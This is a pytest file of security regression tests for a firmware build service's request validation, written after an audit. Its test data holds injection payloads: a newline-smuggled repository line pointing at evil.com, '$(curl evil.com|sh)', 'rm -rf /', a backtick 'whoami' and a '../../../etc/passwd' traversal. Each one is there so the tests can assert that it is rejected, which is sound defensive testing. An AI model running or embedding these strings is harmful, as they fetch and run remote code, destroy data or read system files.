"""Security regression tests for issues found in the 2026-02-06 audit."""

import pytest

from asu.build import IMAGE_NAME_RE
from asu.build_request import BuildRequest


# --- Fix #1: Repository name newline injection ---


def test_repo_name_rejects_newline():
    """Repository name with embedded newline must be rejected by Pydantic."""
    with pytest.raises(Exception):
        BuildRequest(
            version="1.2.3",
            target="testtarget/testsubtarget",
            profile="testprofile",
            repositories={"evil\nsrc/gz pwned http://x.com": "https://a.com/repo"},
        )


def test_repo_name_rejects_spaces():
    """Repository name with spaces must be rejected."""
    with pytest.raises(Exception):
        BuildRequest(
            version="1.2.3",
            target="testtarget/testsubtarget",
            profile="testprofile",
            repositories={"name with spaces": "https://a.com/repo"},
        )


def test_repo_name_rejects_slashes():
    """Repository name with slashes must be rejected."""
    with pytest.raises(Exception):
        BuildRequest(
            version="1.2.3",
            target="testtarget/testsubtarget",
            profile="testprofile",
            repositories={"src/gz": "https://a.com/repo"},
        )


def test_repo_name_accepts_valid():
    """Valid repository names must be accepted."""
    req = BuildRequest(
        version="1.2.3",
        target="testtarget/testsubtarget",
        profile="testprofile",
        repositories={"custom-repo": "https://example.com/repo"},
    )
    assert "custom-repo" in req.repositories


def test_repo_name_accepts_dots_underscores():
    req = BuildRequest(
        version="1.2.3",
        target="testtarget/testsubtarget",
        profile="testprofile",
        repositories={"my_repo.v2": "https://example.com/repo"},
    )
    assert "my_repo.v2" in req.repositories


def test_repo_name_rejects_empty():
    """Empty repository name must be rejected."""
    with pytest.raises(Exception):
        BuildRequest(
            version="1.2.3",
            target="testtarget/testsubtarget",
            profile="testprofile",
            repositories={"": "https://a.com/repo"},
        )


# --- Fix #1 via API ---


def test_api_repo_name_newline_injection(client):
    """Newline in repository name must be rejected at the API level."""
    response = client.post(
        "/api/v1/build",
        json={
            "version": "1.2.3",
            "target": "testtarget/testsubtarget",
            "profile": "testprofile",
            "repositories": {
                "legit\nsrc/gz pwned http://evil.com": "https://example.com/repo"
            },
        },
    )
    assert response.status_code == 422


# --- Repository URL validation ---


def test_repo_url_rejects_non_http():
    """Repository URLs must start with http:// or https://."""
    with pytest.raises(Exception):
        BuildRequest(
            version="1.2.3",
            target="testtarget/testsubtarget",
            profile="testprofile",
            repositories={"repo": "ftp://example.com/repo"},
        )


def test_repo_url_rejects_no_scheme():
    with pytest.raises(Exception):
        BuildRequest(
            version="1.2.3",
            target="testtarget/testsubtarget",
            profile="testprofile",
            repositories={"repo": "example.com/repo"},
        )


def test_repo_url_accepts_https():
    req = BuildRequest(
        version="1.2.3",
        target="testtarget/testsubtarget",
        profile="testprofile",
        repositories={"repo": "https://example.com/packages"},
    )
    assert req.repositories["repo"] == "https://example.com/packages"


def test_repo_url_accepts_http():
    req = BuildRequest(
        version="1.2.3",
        target="testtarget/testsubtarget",
        profile="testprofile",
        repositories={"repo": "http://example.com/packages"},
    )
    assert req.repositories["repo"] == "http://example.com/packages"


# --- Fix #3: Image name validation ---


def test_image_name_regex_accepts_valid():
    assert IMAGE_NAME_RE.match("openwrt-23.05.2-ath79-generic-sysupgrade.bin")
    assert IMAGE_NAME_RE.match("firmware-v1.0+r12345.img")


def test_image_name_regex_rejects_shell_injection():
    assert not IMAGE_NAME_RE.match("$(curl evil.com|sh)")
    assert not IMAGE_NAME_RE.match("file; rm -rf /")
    assert not IMAGE_NAME_RE.match("`whoami`")
    assert not IMAGE_NAME_RE.match("file name with spaces")
    assert not IMAGE_NAME_RE.match("../../../etc/passwd")


# --- Fix #6: Client field validation ---


def test_client_field_rejects_special_chars():
    """Client field with shell metacharacters must be rejected."""
    with pytest.raises(Exception):
        BuildRequest(
            version="1.2.3",
            target="testtarget/testsubtarget",
            profile="testprofile",
            client="evil;rm -rf /",
        )


def test_client_field_rejects_newlines():
    with pytest.raises(Exception):
        BuildRequest(
            version="1.2.3",
            target="testtarget/testsubtarget",
            profile="testprofile",
            client="evil\nclient",
        )


def test_client_field_accepts_valid():
    req = BuildRequest(
        version="1.2.3",
        target="testtarget/testsubtarget",
        profile="testprofile",
        client="luci/git-22.073.39928-701ea94",
    )
    assert req.client == "luci/git-22.073.39928-701ea94"


def test_client_field_accepts_none():
    req = BuildRequest(
        version="1.2.3",
        target="testtarget/testsubtarget",
        profile="testprofile",
    )
    assert req.client is None


# --- Fix #7: user_agent None handling ---


def test_api_build_no_user_agent(client):
    """Build without User-Agent header must not crash."""
    response = client.post(
        "/api/v1/build",
        json={
            "version": "1.2.3",
            "target": "testtarget/testsubtarget",
            "profile": "testprofile",
        },
        headers={"User-Agent": ""},
    )
    # Should not return 500 (AttributeError on None)
    assert response.status_code in (200, 202)
